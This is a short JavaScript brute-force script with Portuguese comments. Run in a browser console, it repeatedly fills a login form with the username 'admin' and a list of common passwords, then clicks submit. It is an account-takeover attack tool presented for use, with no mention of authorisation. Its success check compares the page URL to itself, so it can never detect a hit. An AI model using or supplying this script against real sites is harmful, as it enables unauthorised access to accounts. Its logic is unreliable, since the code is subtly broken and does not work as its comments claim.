// Script de teste de força bruta para formulário de login
// Ajuste os seletores e a lista de senhas conforme necessário

// Configurações
const usernameFieldId = 'username'; // ID do campo de usuário
const passwordFieldId = 'password'; // ID do campo de senha
const submitButtonId = 'submit'; // ID do botão de submit
const targetUsername = 'admin'; // Usuário alvo para o teste
const passwords = ['password', '123456', 'admin', 'test', 'qwerty']; // Lista de senhas para testar
const delayBetweenAttempts = 1000; // Delay entre tentativas (em ms)

// Função para simular o login
function tryLogin(username, password) {
    return new Promise((resolve) => {
        // Preenche os campos do formulário
        const usernameInput = document.getElementById(usernameFieldId);
        const passwordInput = document.getElementById(passwordFieldId);
        const submitButton = document.getElementById(submitButtonId);

        if (!usernameInput || !passwordInput || !submitButton) {
            console.error('Campos ou botão não encontrados. Verifique os IDs.');
            resolve(false);
            return;
        }

        usernameInput.value = username;
        passwordInput.value = password;

        // Simula o clique no botão de submit
        submitButton.click();

        // Aguarda um tempo para verificar o resultado (ex.: redirecionamento ou erro)
        setTimeout(() => {
            // Verifica se o login foi bem-sucedido (exemplo: checa se a URL mudou)
            const success = window.location.href !== window.location.href; // Ajuste a lógica conforme necessário
            resolve(success);
        }, delayBetweenAttempts);
    });
}

// Função principal para executar o teste de força bruta
async function bruteForce() {
    console.log('Iniciando teste de força bruta...');
    for (let password of passwords) {
        console.log(`Testando senha: ${password}`);
        const success = await tryLogin(targetUsername, password);
        if (success) {
            console.log(`Sucesso! Senha encontrada: ${password}`);
            return;
        } else {
            console.log(`Falha com a senha: ${password}`);
        }
    }
    console.log('Teste concluído. Nenhuma senha funcionou.');
}

// Inicia o teste
bruteForce();
